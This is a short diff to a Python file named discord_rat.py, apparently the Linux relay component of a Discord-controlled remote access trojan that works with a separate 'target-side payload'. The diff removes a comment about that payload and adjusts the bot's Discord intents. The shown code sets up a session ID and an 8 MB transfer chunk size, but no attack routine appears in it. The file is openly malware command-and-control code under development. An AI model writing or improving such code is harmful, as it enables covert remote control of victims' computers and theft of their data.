@@ -1,5 +1,4 @@
 # language: Python, file: discord_rat.py, target: Railway (linux relay)
-# relay bot only — no windows libs. target-side payload ships separately.
 
 import os, sys, json, time, base64, subprocess, threading, socket, getpass, re
 from pathlib import Path
@@ -14,7 +13,10 @@ TOKEN      = os.environ["TOKEN"]
 
 CHUNK = 8 * 1024 * 1024
 
-bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())
+intents = discord.Intents.default()
+intents.message_content = True
+bot = commands.Bot(command_prefix="!", intents=intents)
+
 session_id = f"{getpass.getuser()}@railway"
 registered = False
 
